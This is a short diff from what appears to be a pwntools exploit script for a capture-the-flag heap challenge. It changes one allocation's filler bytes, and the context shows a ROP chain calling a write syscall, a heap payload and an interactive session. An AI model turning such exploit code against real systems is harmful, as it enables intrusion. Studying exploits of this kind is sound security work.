@@ -357,7 +357,7 @@ rop.call('syscall', [1, 1, output, 0x64])
 
 # gdb.attach(p)
 # print(rop.dump())
-malloc_letter(3, 256, b"xx")
+malloc_letter(3, 256, b"aaaa")
 malloc_letter(3, 256, payload + rop.chain())
 
 p.interactive()
